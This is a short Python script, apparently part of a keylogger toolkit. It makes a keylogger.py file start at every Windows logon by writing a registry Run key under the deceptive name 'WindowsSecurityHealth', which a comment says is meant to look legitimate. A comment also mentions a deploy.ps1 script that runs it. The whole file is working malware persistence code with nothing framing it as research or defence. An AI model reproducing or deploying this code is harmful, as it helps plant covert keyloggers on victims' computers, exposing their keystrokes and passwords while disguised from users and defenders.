import winreg
from pathlib import Path
import sys

# Config 
REG_KEY   = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME  = "WindowsSecurityHealth"  # "oh its legit bro"

def get_payload_path():
    """Returns the full path to keylogger.py with the python interpreter."""
    python = sys.executable
    script = Path(__file__).resolve().parent / "keylogger.py"
    return f'"{python}" "{script}"'

def install():
    """Adds keylogger to registry Run key."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, get_payload_path())
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

def is_installed():
    """Check if the registry entry already exists."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_KEY,
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(key, REG_NAME)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


if __name__ == "__main__":
    # So deploy.ps1 can run: python persistence.py — actually installs the Run key
    install()